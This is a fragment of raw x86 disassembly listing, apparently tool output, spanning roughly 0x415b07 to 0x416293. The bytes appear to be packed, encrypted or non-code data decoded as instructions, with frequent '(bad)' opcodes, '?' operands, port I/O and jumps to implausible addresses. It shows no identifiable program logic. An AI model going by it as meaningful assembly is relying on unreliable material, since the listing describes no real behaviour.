  415b07:	cmp    ebx,esp
  415b09:	(bad)  
  415b0b:	cdq    
  415b0c:	pop    edi
  415b0d:	rol    BYTE PTR [esi],1
  415b0f:	pop    ss
  415b10:	lods   eax,DWORD PTR ds:[esi]
  415b11:	xor    eax,DWORD PTR [esp+edi*4+0x43]
  415b15:	or     eax,0x414c3568
  415b1a:	xchg   BYTE PTR [esi+edi*8+0x55],cl
  415b1e:	cmp    dh,BYTE PTR [edi-0x573fb21f]
  415b24:	adc    al,0x49
  415b26:	mov    edi,0x7c870cb4
  415b2b:	dec    edi
  415b2c:	sub    ah,BYTE PTR [ebp+0x7f0f80ef]
  415b32:	or     eax,0xaff7f502
  415b37:	daa    
  415b38:	cli    
  415b39:	pop    ss
  415b3a:	dec    esi
  415b3b:	jb     0x415b00
  415b3d:	sub    dh,cl
  415b3f:	sar    BYTE PTR [edi],1
  415b41:	dec    ebx
  415b42:	xchg   ebx,eax
  415b43:	or     ebx,ebp
  415b45:	fcmove st,st(6)
  415b47:	loope  0x415ad4
  415b49:	lahf   
  415b4a:	or     ecx,esp
  415b4c:	ret    0x65f8
  415b4f:	push   edi
  415b50:	call   0xffc9d9fc
  415b55:	mov    bh,0x92
  415b57:	lock cmp edx,0xffffffb3
  415b5b:	aad    0x40
  415b5d:	fwait
  415b5e:	dec    edx
  415b5f:	out    0x8c,al
  415b61:	test   al,0xf5
  415b63:	sti    
  415b64:	cdq    
  415b65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b66:	push   gs
  415b68:	jecxz  0x415ba3
  415b6a:	aaa    
  415b6b:	imul   ebp,esp,0xe50bec9c
  415b71:	adc    DWORD PTR [esi+0x7b],esi
  415b74:	out    0x91,eax
  415b76:	jl     0x415b85
  415b78:	icebp  
  415b79:	fld    TBYTE PTR [eax]
  415b7b:	jne    0x415bbc
  415b7d:	push   cs
  415b7e:	mov    ah,0x22
  415b80:	aam    0xf
  415b82:	pushf  
  415b83:	sub    eax,0x20ddc637
  415b88:	call   0xa42ab4cf
  415b8d:	jmp    0x415bc3
  415b8f:	jno    0x415b85
  415b91:	xchg   ecx,eax
  415b92:	push   esi
  415b93:	outs   dx,BYTE PTR ds:[esi]
  415b94:	scas   eax,DWORD PTR es:[edi]
  415b95:	adc    BYTE PTR [edx+0x7380a591],al
  415b9b:	add    DWORD PTR [ebx],eax
  415b9d:	jb     0x415bcc
  415b9f:	pop    ds
  415ba0:	add    eax,0x27ee0092
  415ba5:	(bad)  
  415ba6:	jno    0x415b7a
  415ba8:	mov    BYTE PTR [eax-0x5488787c],dl
  415bae:	sub    eax,0xc1a03153
  415bb3:	int    0xd3
  415bb5:	xor    BYTE PTR [ebp+0x3379a96a],bh
  415bbb:	outs   dx,DWORD PTR ds:[esi]
  415bbc:	sub    al,0xe3
  415bbe:	xchg   esp,eax
  415bbf:	add    al,0xaf
  415bc1:	ret    
  415bc2:	and    DWORD PTR [esi-0x6c55ac87],esi
  415bc8:	adc    edx,DWORD PTR [esi+0x35a8034b]
  415bce:	pop    edx
  415bcf:	xor    BYTE PTR [ebp-0x3b982000],cl
  415bd5:	imul   eax,DWORD PTR [edi],0xffffff97
  415bd8:	or     DWORD PTR [ebp+0x16],eax
  415bdb:	jbe    0x415b98
  415bdd:	imul   ebx,DWORD PTR [edx],0xffffffe2
  415be0:	and    al,0x7b
  415be2:	adc    BYTE PTR [eax-0x66],al
  415be5:	jmp    0x5a1cdeb3
  415bea:	test   ebx,esp
  415bec:	mov    ah,0x39
  415bee:	fidivr WORD PTR [edx]
  415bf0:	setbe  BYTE PTR [ebp-0x2b]
  415bf4:	mov    BYTE PTR [edi+0x7a],bl
  415bf7:	cwde   
  415bf8:	in     al,dx
  415bf9:	xchg   ebx,eax
  415bfa:	arpl   WORD PTR [edx+0x3d],cx
  415bfd:	(bad)  
  415bfe:	xchg   ecx,eax
  415bff:	or     al,0xe3
  415c01:	mov    dh,0x96
  415c03:	xor    al,0x83
  415c05:	mov    ecx,0x6753d77b
  415c0a:	jmp    0x4d4d:0x4002c376
  415c11:	ja     0x415c3c
  415c13:	adc    ah,dh
  415c15:	and    DWORD PTR [ecx-0x63],0x66
  415c19:	adc    DWORD PTR [esi+edx*2],edx
  415c1c:	ficomp DWORD PTR [edx+esi*4]
  415c1f:	sbb    edx,DWORD PTR [esi+ebx*4]
  415c22:	into   
  415c23:	nop
  415c24:	in     al,0x42
  415c26:	rcl    dh,1
  415c28:	aam    0xe6
  415c2a:	stos   DWORD PTR es:[edi],eax
  415c2b:	out    0x39,al
  415c2d:	push   eax
  415c2e:	push   edi
  415c2f:	rcl    BYTE PTR [ebp+0x1ecde1c5],0xfb
  415c36:	mov    edi,0x3620a4c1
  415c3b:	test   BYTE PTR [edx+0x4cd886d1],dl
  415c41:	pop    ss
  415c42:	(bad)  
  415c43:	jmp    0x415ca1
  415c45:	cmp    eax,0x3fb0faf1
  415c4a:	imul   BYTE PTR [esi]
  415c4c:	pop    esp
  415c4d:	or     eax,0x12ea3b39
  415c52:	inc    edx
  415c53:	xor    al,BYTE PTR [ecx+eax*8-0x36]
  415c57:	pop    ss
  415c58:	xchg   ebx,eax
  415c59:	dec    eax
  415c5a:	xor    esp,DWORD PTR [eax+edi*4-0x4e]
  415c5e:	loope  0x415bf3
  415c60:	or     bh,dl
  415c62:	add    al,0x53
  415c64:	leave  
  415c65:	cmp    DWORD PTR [eax-0x1cded06c],ecx
  415c6b:	test   BYTE PTR [edx+0xfcca156],bl
  415c71:	cmp    al,BYTE PTR [ecx+0x2ac19d07]
  415c77:	mov    bl,0xc
  415c79:	cld    
  415c7a:	adc    al,0x9c
  415c7c:	(bad)  
  415c7d:	pop    ds
  415c7e:	fmul   QWORD PTR [ebx]
  415c80:	inc    esp
  415c81:	loopne 0x415c4e
  415c83:	pop    ebx
  415c84:	es scas al,BYTE PTR es:[edi]
  415c86:	lods   al,BYTE PTR ds:[esi]
  415c87:	mov    dh,0xda
  415c89:	in     eax,dx
  415c8a:	dec    esi
  415c8b:	xchg   BYTE PTR [ecx],bl
  415c8d:	ja     0x415ccb
  415c8f:	lods   eax,DWORD PTR ds:[esi]
  415c90:	mov    esp,gs
  415c92:	ret    
  415c93:	ja     0x415c4d
  415c95:	test   DWORD PTR [edi-0x340490fd],edi
  415c9b:	push   cs
  415c9c:	adc    dh,BYTE PTR [ecx]
  415c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c9f:	inc    ebp
  415ca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ca1:	xchg   edx,eax
  415ca2:	mov    bl,0x15
  415ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ca5:	xchg   esi,eax
  415ca6:	xchg   ebx,eax
  415ca7:	sub    edx,DWORD PTR [ebx]
  415ca9:	sub    al,0x32
  415cab:	scas   eax,DWORD PTR es:[edi]
  415cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cad:	xchg   cl,dl
  415caf:	sub    al,BYTE PTR [edi-0x247c3531]
  415cb5:	scas   al,BYTE PTR es:[edi]
  415cb6:	mov    bh,0xab
  415cb8:	push   es
  415cb9:	push   0x553a9e49
  415cbe:	cmp    al,0xf8
  415cc0:	test   BYTE PTR [ecx+0x2e95fc6],bh
  415cc6:	dec    ebp
  415cc7:	sbb    edi,DWORD PTR gs:[ebp+0x22]
  415ccb:	dec    ecx
  415ccc:	loope  0x415d43
  415cce:	add    ah,BYTE PTR [ebp+edi*4+0x56]
  415cd2:	mov    ah,0x2f
  415cd4:	out    0x5f,al
  415cd6:	xlat   BYTE PTR ds:[ebx]
  415cd7:	jae    0x415c67
  415cd9:	cmp    ebx,esi
  415cdb:	cwde   
  415cdc:	xor    ebp,DWORD PTR [ebx]
  415cde:	js     0x415d12
  415ce0:	or     eax,0xcf0946b2
  415ce5:	jp     0x415d4e
  415ce7:	fnsave [eax-0x4eb27da0]
  415ced:	mov    ds,WORD PTR [edx-0x44]
  415cf0:	out    0x79,al
  415cf2:	mov    al,0x9d
  415cf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cf5:	test   eax,0xfa13cde0
  415cfa:	into   
  415cfb:	imul   ebx,DWORD PTR [edx],0x31195628
  415d01:	mov    edi,0xd5ff0426
  415d06:	nop
  415d07:	jp     0x415d76
  415d09:	add    al,0xcc
  415d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d0c:	mov    esi,0x7ab163f2
  415d11:	cmp    al,0x39
  415d13:	shl    DWORD PTR [ebx-0x56],1
  415d16:	sbb    edx,DWORD PTR ds:0x5c12be0d
  415d1c:	jmp    DWORD PTR [ebx+0x30]
  415d1f:	sbb    eax,0xe900d7b5
  415d24:	pop    ds
  415d25:	daa    
  415d26:	xchg   esi,eax
  415d27:	cli    
  415d28:	sub    ecx,DWORD PTR [ebx+0x60]
  415d2b:	mov    edx,DWORD PTR [ebx+ebp*2]
  415d2e:	adc    edx,DWORD PTR [esi-0x1cc1c0ce]
  415d34:	aad    0x94
  415d36:	jle    0x415d29
  415d38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d39:	cmp    BYTE PTR [esi],al
  415d3b:	stos   DWORD PTR es:[edi],eax
  415d3c:	mov    ?,edx
  415d3e:	sub    ebx,DWORD PTR fs:[edx-0x7e2dfc0a]
  415d45:	xchg   esi,eax
  415d46:	aaa    
  415d47:	hlt    
  415d48:	pop    ecx
  415d49:	test   BYTE PTR [edx+0x1117f29e],0x54
  415d50:	or     BYTE PTR [edi-0x32a23ef],al
  415d56:	dec    esp
  415d57:	pusha  
  415d58:	int3   
  415d59:	(bad)  ds:0x7385acc8
  415d5f:	cdq    
  415d60:	xchg   esi,eax
  415d61:	jbe    0x415dce
  415d63:	rol    DWORD PTR [edx-0x6a7b28d7],0x93
  415d6a:	cmp    bl,BYTE PTR [esi-0x6927cd40]
  415d70:	adc    esi,DWORD PTR [ecx+esi*2-0x43]
  415d74:	and    DWORD PTR [eax],edx
  415d76:	inc    edi
  415d77:	xchg   BYTE PTR [ebp-0x4e],ah
  415d7a:	jns    0x415cfc
  415d7c:	fwait
  415d7d:	retf   
  415d7e:	push   0xaedd961f
  415d83:	arpl   WORD PTR [ecx+0x79],cx
  415d86:	and    dl,bl
  415d88:	and    ebx,DWORD PTR [edi-0x7c]
  415d8b:	sub    al,0x1d
  415d8d:	adc    esi,DWORD PTR [esi+0x21cafffc]
  415d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d94:	mov    dl,0xe1
  415d96:	pop    esi
  415d97:	test   BYTE PTR [esp+ebx*1-0x20c575dc],al
  415d9e:	sub    esi,edi
  415da0:	mov    cl,0x39
  415da2:	adc    edx,DWORD PTR [ebx+ecx*8-0x699ea2da]
  415da9:	sbb    al,0x84
  415dab:	pop    ss
  415dac:	mov    ebx,0x4a47a6c9
  415db1:	into   
  415db2:	mov    dh,0xc8
  415db4:	ret    0x6006
  415db7:	inc    ecx
  415db8:	push   esi
  415db9:	push   ebp
  415dba:	iret   
  415dbb:	pop    eax
  415dbc:	in     eax,0x96
  415dbe:	cmp    ebx,DWORD PTR ds:0xdbb0e1be
  415dc4:	xchg   ebp,eax
  415dc5:	sbb    esi,DWORD PTR [esi+0x487c3461]
  415dcb:	ins    BYTE PTR es:[edi],dx
  415dcc:	sbb    eax,0x13373fae
  415dd1:	sbb    BYTE PTR [ecx+0x33],0xb8
  415dd5:	cdq    
  415dd6:	and    al,0x88
  415dd8:	push   esi
  415dd9:	xchg   edi,eax
  415dda:	mov    ch,0xd1
  415ddc:	(bad)  
  415ddd:	fnstsw WORD PTR [edx+0x573ef123]
  415de3:	cmc    
  415de4:	in     eax,dx
  415de5:	mov    esi,0xb207dcc
  415dea:	push   0x4b
  415dec:	inc    esp
  415ded:	(bad)  
  415dee:	(bad)  
  415def:	shr    DWORD PTR [ebp+0x226801ba],1
  415df5:	stos   DWORD PTR es:[edi],eax
  415df6:	pop    ebx
  415df7:	aad    0xb1
  415df9:	xchg   DWORD PTR [eax],eax
  415dfb:	sbb    eax,0x678c9a5f
  415e00:	xor    al,0x80
  415e02:	mov    al,0x2c
  415e04:	jge    0x415dcf
  415e06:	add    ebp,DWORD PTR [edi]
  415e08:	out    0xb3,al
  415e0a:	jno    0x415e68
  415e0c:	xor    BYTE PTR [edi+edx*8+0x4d99f736],bh
  415e13:	or     BYTE PTR [ebp-0x423ed9c1],dh
  415e19:	in     al,0xc7
  415e1b:	sub    BYTE PTR [ecx],dh
  415e1d:	xchg   DWORD PTR [edx+0x2c4c94de],esi
  415e23:	mov    edx,0xbea6f1df
  415e28:	xor    BYTE PTR [esi*8-0x6fd15cd2],dl
  415e2f:	or     bl,BYTE PTR [eax+ebp*1+0x42]
  415e33:	or     dh,BYTE PTR [ebx]
  415e35:	std    
  415e36:	or     cl,BYTE PTR [esi]
  415e38:	sbb    eax,0xc3223aa5
  415e3d:	pop    esp
  415e3e:	and    BYTE PTR [ebx-0x75011bbf],ch
  415e44:	ja     0x415e81
  415e46:	fsubr  QWORD PTR [edi+0x452e8d50]
  415e4c:	pop    ds
  415e4d:	or     eax,0xac17a50b
  415e52:	mov    si,0x3a1
  415e56:	stos   DWORD PTR es:[edi],eax
  415e57:	or     al,0xb5
  415e59:	and    ecx,DWORD PTR [edx-0x47]
  415e5c:	mov    ebx,0x783addce
  415e61:	push   ecx
  415e62:	loope  0x415e44
  415e64:	and    ecx,ebx
  415e66:	leave  
  415e67:	enter  0xb5cc,0x9c
  415e6b:	sbb    eax,0x90dec390
  415e70:	push   edi
  415e71:	test   al,0x69
  415e73:	test   dl,al
  415e75:	retf   0x47ae
  415e78:	cs add ecx,ebp
  415e7b:	mov    al,fs:0xb10e22ee
  415e81:	fcomp  DWORD PTR [ebx-0x449f4b4d]
  415e87:	lods   eax,DWORD PTR ds:[esi]
  415e88:	call   0x659b:0xe54b13d0
  415e8f:	retf   0x832c
  415e92:	and    bp,WORD PTR [ecx]
  415e95:	or     DWORD PTR [ebx-0x78],edi
  415e98:	xor    eax,0xba82c187
  415e9d:	sahf   
  415e9e:	(bad)  
  415e9f:	jp     0x415ee1
  415ea1:	xchg   BYTE PTR [edx],ah
  415ea3:	push   0x764582e4
  415ea8:	int    0x89
  415eaa:	pusha  
  415eab:	sub    ecx,ebx
  415ead:	dec    ebp
  415eae:	push   edi
  415eaf:	adc    al,0xf2
  415eb1:	mov    edx,0x2c30a96f
  415eb6:	dec    ebx
  415eb7:	enter  0xc8bb,0xd1
  415ebb:	mov    esi,edi
  415ebd:	and    eax,0x3b41b850
  415ec2:	sub    ah,BYTE PTR [ebx]
  415ec4:	stc    
  415ec5:	shr    dh,0x77
  415ec8:	inc    edx
  415ec9:	into   
  415eca:	add    esp,DWORD PTR [eax]
  415ecc:	add    DWORD PTR [ebx],esi
  415ece:	or     edx,edx
  415ed0:	or     BYTE PTR [ebx],bl
  415ed2:	mov    ch,0x88
  415ed4:	je     0x415e82
  415ed6:	ins    BYTE PTR es:[edi],dx
  415ed7:	bnd jbe 0x415e66
  415eda:	push   esp
  415edb:	int    0xab
  415edd:	call   0x9113242a
  415ee2:	xchg   edx,eax
  415ee3:	fdivr  QWORD PTR [eax+ecx*2]
  415ee6:	mov    eax,0xb74855eb
  415eeb:	push   eax
  415eec:	adc    bh,bh
  415eee:	test   BYTE PTR [eax],0x78
  415ef1:	push   esp
  415ef2:	stos   DWORD PTR es:[edi],eax
  415ef3:	dec    esi
  415ef4:	sahf   
  415ef5:	push   cs
  415ef6:	and    eax,0xf7e735b
  415efb:	pop    ebx
  415efc:	nop
  415efd:	and    al,0xe9
  415eff:	std    
  415f00:	and    al,0x7b
  415f02:	sti    
  415f03:	dec    edi
  415f04:	icebp  
  415f05:	ja     0x415f5f
  415f07:	out    dx,eax
  415f08:	test   eax,0x404242e7
  415f0d:	ss inc ebp
  415f0f:	pop    ebp
  415f10:	stos   BYTE PTR es:[edi],al
  415f11:	in     eax,dx
  415f12:	aam    0xb6
  415f14:	data16 jge 0x415f00
  415f17:	popa   
  415f18:	ja     0x415eb4
  415f1a:	test   DWORD PTR [eax],0xc70d56b0
  415f20:	call   0xc699:0xc9816f43
  415f27:	jns    0x415eec
  415f29:	(bad)  
  415f2a:	mov    eax,0x8560d770
  415f2f:	scas   eax,DWORD PTR es:[edi]
  415f30:	mov    al,0xd1
  415f32:	loopne 0x415f25
  415f34:	pop    eax
  415f35:	or     dh,BYTE PTR [ecx]
  415f37:	scas   al,BYTE PTR es:[edi]
  415f38:	es scas eax,DWORD PTR es:[edi]
  415f3a:	pop    ecx
  415f3b:	loopne 0x415f53
  415f3d:	aaa    
  415f3e:	(bad)  
  415f3f:	jle    0x415eee
  415f41:	pop    edx
  415f42:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f44:	xor    dl,BYTE PTR [ebx-0x4a]
  415f47:	xchg   edi,eax
  415f48:	xor    eax,0x429edcf5
  415f4d:	cmp    esp,ebp
  415f4f:	into   
  415f50:	mov    DWORD PTR [eax],eax
  415f52:	xchg   edx,eax
  415f53:	or     eax,0x12c2317a
  415f58:	mov    bl,0x62
  415f5a:	adc    BYTE PTR [ecx+ecx*4-0x26],dh
  415f5e:	push   ecx
  415f5f:	dec    edx
  415f60:	test   DWORD PTR [edx+0x1921dd4a],ecx
  415f66:	mov    BYTE PTR [ecx-0x378b15c3],ah
  415f6c:	enter  0x97ca,0x65
  415f70:	push   ds
  415f71:	in     al,0xbe
  415f73:	adc    al,0x98
  415f75:	aaa    
  415f76:	loopne 0x415f95
  415f78:	iret   
  415f79:	lock into 
  415f7b:	jne    0x415f19
  415f7d:	lods   al,BYTE PTR ds:[esi]
  415f7e:	loope  0x415fc7
  415f80:	mov    BYTE PTR [edi-0xe164fb0],bl
  415f86:	pop    ss
  415f87:	(bad)  
  415f88:	cmp    al,0xa4
  415f8a:	in     eax,dx
  415f8b:	shr    eax,1
  415f8d:	adc    ebp,DWORD PTR [edx+0xf0c968b]
  415f93:	imul   edx,DWORD PTR [ebp+eax*2+0x4137647c],0x79fe8ca5
  415f9e:	xor    bl,dh
  415fa0:	xchg   edx,eax
  415fa1:	mov    bl,0x9b
  415fa3:	addr16 aaa 
  415fa5:	sub    al,BYTE PTR [edx+ebp*4]
  415fa8:	into   
  415fa9:	mov    ds:0xe5e699a4,al
  415fae:	popf   
  415faf:	xor    ch,BYTE PTR [esi]
  415fb1:	icebp  
  415fb2:	push   edx
  415fb3:	bound  edx,QWORD PTR [ecx]
  415fb5:	mov    esp,0x110a60c4
  415fba:	inc    esi
  415fbb:	aaa    
  415fbc:	jnp    0x415f79
  415fbe:	push   ds
  415fbf:	or     cl,BYTE PTR [esi+esi*2-0x19a947a2]
  415fc6:	pop    ecx
  415fc7:	xor    eax,0x920dd591
  415fcc:	add    esi,DWORD PTR [edx-0x251bee0]
  415fd2:	arpl   WORD PTR [eax+0x607627d6],sp
  415fd8:	aas    
  415fd9:	adc    al,0xe8
  415fdb:	out    0x57,al
  415fdd:	mov    bh,0xab
  415fdf:	outs   dx,BYTE PTR ds:[esi]
  415fe0:	cmp    DWORD PTR [ecx],edi
  415fe2:	stc    
  415fe3:	push   edi
  415fe4:	sbb    esi,eax
  415fe6:	loopne 0x41601e
  415fe8:	sbb    BYTE PTR ds:0x1895e741,ah
  415fee:	or     eax,0x5daa831e
  415ff3:	cs gs dec edx
  415ff6:	fld    TBYTE PTR [ecx-0x14]
  415ff9:	imul   eax,DWORD PTR [esi],0xeb700d50
  415fff:	aas    
  416000:	in     al,0xb3
  416002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416003:	xchg   BYTE PTR [ebp+0x70],cl
  416006:	fdivr  DWORD PTR [ebx+0x2c]
  416009:	mov    ebx,0xfbe6b840
  41600e:	mov    ebx,0x4df98dbe
  416013:	test   esi,ecx
  416015:	(bad)  
  416017:	shr    DWORD PTR [edi+0x6b93b84a],0xff
  41601e:	mov    ebp,0x5d1bc2cf
  416023:	(bad)  
  416024:	sub    eax,0x66409b63
  416029:	sub    BYTE PTR [esi+0x1b],0x29
  41602d:	ss cdq 
  41602f:	mov    WORD PTR [eax],ss
  416031:	in     eax,0x23
  416033:	pop    es
  416034:	lods   eax,DWORD PTR ds:[esi]
  416035:	dec    ecx
  416036:	in     eax,dx
  416037:	inc    ebp
  416038:	fadd   st(2),st
  41603a:	imul   ecx,DWORD PTR [esi+0x7dfef],0xffffffa9
  416041:	ja     0x4160a0
  416043:	cli    
  416044:	or     BYTE PTR [edx+0x6a9d3912],dh
  41604a:	mov    dh,0xb4
  41604c:	popf   
  41604d:	or     DWORD PTR [ebx+edi*8+0x57],ebp
  416051:	pop    esp
  416052:	dec    esp
  416053:	add    edi,DWORD PTR [ecx+0x59]
  416056:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  416058:	mov    BYTE PTR [esi-0x39],dl
  41605b:	cdq    
  41605c:	jo     0x416010
  41605e:	mov    DWORD PTR fs:[ebx-0x22],esp
  416062:	sbb    al,0x8e
  416064:	mov    al,ds:0x22e4d361
  416069:	jbe    0x416023
  41606b:	xchg   esi,eax
  41606c:	shl    BYTE PTR [ecx+0x34040580],0xbe
  416073:	mov    esi,0xe35511f5
  416078:	mov    dl,0x56
  41607a:	cmp    ecx,DWORD PTR [ecx-0x49]
  41607d:	lods   eax,DWORD PTR ds:[esi]
  41607e:	hlt    
  41607f:	xor    bl,dh
  416081:	daa    
  416082:	jmp    0x2a38b79d
  416087:	adc    DWORD PTR ds:0x74e1ceb4,edx
  41608d:	call   0x74f2:0x850841e9
  416094:	dec    edx
  416095:	loop   0x416076
  416097:	sti    
  416098:	xor    edx,DWORD PTR [edi]
  41609a:	mov    ds:0x914b654b,al
  41609f:	or     BYTE PTR cs:[edx-0x59514ea6],ch
  4160a6:	cdq    
  4160a7:	fucomp st(2)
  4160a9:	or     DWORD PTR [ecx],ebp
  4160ab:	in     eax,0x83
  4160ad:	push   ss
  4160ae:	sbb    bh,bh
  4160b0:	cs push edx
  4160b2:	adc    edx,ebp
  4160b4:	jle    0x416121
  4160b6:	xchg   BYTE PTR [eax-0x2bb96e3],dl
  4160bc:	into   
  4160bd:	imul   ecx,ebx,0x73
  4160c0:	mov    dh,0xa0
  4160c2:	por    mm1,mm6
  4160c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160c6:	mov    cl,0xb9
  4160c8:	int    0xa5
  4160ca:	(bad)  
  4160cb:	sub    esp,DWORD PTR [ebx]
  4160cd:	adc    ebp,ebp
  4160cf:	xor    eax,0xd2a579cd
  4160d4:	int    0x4f
  4160d6:	pop    edi
  4160d7:	jne    0x416122
  4160d9:	mov    edi,0x401e53c8
  4160de:	mov    gs,WORD PTR [edi+0x4eed479]
  4160e4:	jge    0x41606c
  4160e6:	call   DWORD PTR [ebx]
  4160e8:	inc    ecx
  4160e9:	leave  
  4160ea:	mov    ds:0xf3b45ab9,al
  4160ef:	inc    edi
  4160f0:	jl     0x416158
  4160f2:	mov    edx,0x5a30c88
  4160f7:	imul   edx,ecx,0xaeacc354
  4160fd:	mov    bl,0x11
  4160ff:	neg    cl
  416101:	dec    edx
  416102:	add    eax,DWORD PTR [edx]
  416104:	or     BYTE PTR [ebx+edi*8-0x42],bh
  416108:	leave  
  416109:	push   0xbdb531fa
  41610e:	sub    al,0x59
  416110:	int3   
  416111:	mov    ebx,0xf9317f7a
  416116:	pop    edi
  416117:	scas   eax,DWORD PTR es:[edi]
  416118:	jo     0x416108
  41611a:	cwde   
  41611b:	leave  
  41611c:	gs inc ecx
  41611e:	push   esp
  41611f:	pop    ss
  416120:	push   ebx
  416121:	stos   BYTE PTR es:[edi],al
  416122:	xor    al,BYTE PTR [ebx+0x76]
  416125:	dec    eax
  416126:	pop    edx
  416127:	pop    es
  416128:	or     BYTE PTR [eax+ebp*8],dl
  41612b:	add    eax,0xeb0933a8
  416130:	outs   dx,BYTE PTR ds:[esi]
  416131:	sub    cl,cl
  416133:	xchg   ecx,eax
  416134:	cmp    BYTE PTR [ebx],ch
  416136:	enter  0xe004,0x14
  41613a:	aad    0xc1
  41613c:	sti    
  41613d:	lods   al,BYTE PTR ds:[esi]
  41613e:	or     BYTE PTR [edx],dl
  416140:	scas   eax,DWORD PTR es:[edi]
  416141:	fmul   DWORD PTR [ecx-0x72]
  416144:	jmp    0x2232:0x912114b3
  41614b:	xor    DWORD PTR [edx+0x62a9c958],ebx
  416151:	fs ja  0x4160fb
  416154:	mov    DWORD PTR [eax-0x13c2260],esi
  41615a:	lds    ebp,FWORD PTR [ebx-0x66c91ea7]
  416160:	ins    BYTE PTR es:[edi],dx
  416161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416162:	lods   eax,DWORD PTR ds:[esi]
  416163:	hlt    
  416164:	ret    0x3382
  416167:	jns    0x41618b
  416169:	adc    BYTE PTR [ecx+0x6a],ah
  41616c:	inc    esi
  41616d:	fs fstp st(4)
  416170:	loope  0x4161ce
  416172:	pop    eax
  416173:	(bad)  
  416174:	in     eax,dx
  416175:	in     eax,0x9d
  416177:	sub    BYTE PTR [eax],bh
  416179:	lahf   
  41617a:	sub    ecx,edx
  41617c:	adc    eax,0x8
  41617f:	add    al,0xac
  416181:	push   eax
  416182:	inc    edx
  416183:	jns    0x4161a1
  416185:	cmp    BYTE PTR [edx-0x55383fb0],bl
  41618b:	cmc    
  41618c:	sbb    BYTE PTR [eax+ebp*1],dh
  41618f:	fst    st(1)
  416191:	ret    
  416192:	imul   DWORD PTR ds:0x5c7fc166
  416198:	(bad)  
  416199:	mov    dh,0x8c
  41619b:	das    
  41619c:	xchg   esi,eax
  41619d:	push   ebx
  41619e:	icebp  
  41619f:	push   ss
  4161a0:	jecxz  0x41618e
  4161a2:	add    al,al
  4161a4:	xor    bh,cl
  4161a6:	fwait
  4161a7:	push   ecx
  4161a8:	iret   
  4161a9:	xor    DWORD PTR [ecx+ecx*1-0x11],0x31
  4161ae:	js     0x4161d8
  4161b0:	inc    esi
  4161b1:	jbe    0x416219
  4161b3:	fidivr WORD PTR [ecx]
  4161b5:	pusha  
  4161b6:	xor    ebp,edi
  4161b8:	xor    DWORD PTR [ebx-0x65968eea],esp
  4161be:	or     al,0x35
  4161c0:	push   ss
  4161c1:	out    0x19,al
  4161c3:	out    dx,eax
  4161c4:	(bad)  
  4161c5:	jg     0x4161b4
  4161c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161c8:	in     al,0xb2
  4161ca:	sub    BYTE PTR [ebp+0x64],cl
  4161cd:	cli    
  4161ce:	mov    WORD PTR [edx+0x62],?
  4161d1:	adc    ah,BYTE PTR [ebx-0x5a49de10]
  4161d7:	mov    DWORD PTR [ebp+0x22b5f77],ebx
  4161dd:	xchg   BYTE PTR [ecx+0x446e31fe],dh
  4161e3:	int    0x44
  4161e5:	sar    esp,0x53
  4161e8:	ror    DWORD PTR [ebp+0x57],1
  4161eb:	push   ecx
  4161ec:	push   esp
  4161ed:	dec    edi
  4161ee:	gs xor bh,bh
  4161f1:	adc    edi,DWORD PTR [esi]
  4161f3:	daa    
  4161f4:	loop   0x4161e7
  4161f6:	xchg   bx,ax
  4161f8:	jno    0x41622b
  4161fa:	lods   eax,DWORD PTR ds:[esi]
  4161fb:	inc    ebp
  4161fc:	inc    edi
  4161fd:	cwde   
  4161fe:	cld    
  4161ff:	neg    esi
  416201:	xchg   esi,eax
  416202:	sbb    ecx,esp
  416204:	dec    esi
  416205:	cmp    edi,DWORD PTR [edi]
  416207:	in     eax,dx
  416208:	add    eax,DWORD PTR [edi]
  41620a:	jmp    0xfa4ccc58
  41620f:	mov    dl,0x48
  416211:	mov    esi,0xba68c988
  416216:	call   0x5a0b7eba
  41621b:	adc    eax,0x279a07cf
  416220:	jbe    0x416227
  416222:	cmp    eax,0xd529db49
  416227:	icebp  
  416228:	dec    ebx
  416229:	hlt    
  41622a:	sub    edi,DWORD PTR [ebx]
  41622c:	pop    ds
  41622d:	lds    ecx,FWORD PTR [esi+0x9556d91]
  416233:	pop    ebx
  416234:	(bad)  
  416236:	pop    eax
  416237:	scas   al,BYTE PTR es:[edi]
  416238:	pop    ds
  416239:	inc    esi
  41623a:	lahf   
  41623b:	retf   
  41623c:	cwde   
  41623d:	rcl    BYTE PTR [ebx-0x3b],cl
  416240:	cmp    eax,DWORD PTR [edi+0x20]
  416243:	stos   DWORD PTR es:[edi],eax
  416244:	call   FWORD PTR [esi-0x75242e67]
  41624a:	add    ch,BYTE PTR [ebx+0x54f2aece]
  416250:	or     BYTE PTR [edx+0x32b4d46e],ch
  416256:	jmp    0x50dc:0x42f400b4
  41625d:	xchg   ecx,eax
  41625e:	xor    ah,cl
  416260:	and    ebx,DWORD PTR [edx+0x38812ffc]
  416266:	fwait
  416267:	js     0x4162be
  416269:	outs   dx,BYTE PTR ds:[esi]
  41626a:	dec    eax
  41626b:	pop    ds
  41626c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41626d:	fsubr  st,st(3)
  41626f:	mov    edx,0xf0140065
  416274:	push   ebp
  416275:	jmp    0x76595df4
  41627a:	das    
  41627b:	retf   
  41627c:	nop
  41627d:	cmc    
  41627e:	fstp   QWORD PTR [edi]
  416280:	ret    
  416281:	test   BYTE PTR [ebp-0x23],cl
  416284:	pop    ecx
  416285:	dec    ecx
  416286:	mov    ds:0x6e0d65e2,al
  41628b:	test   DWORD PTR [eax+0x4e],ebp
  41628e:	scas   eax,DWORD PTR es:[edi]
  41628f:	ins    BYTE PTR es:[edi],dx
  416290:	imul   BYTE PTR [ebx-0x2d]
  416293:	sbb    bh,BYTE PTR [edx-0x147c002]
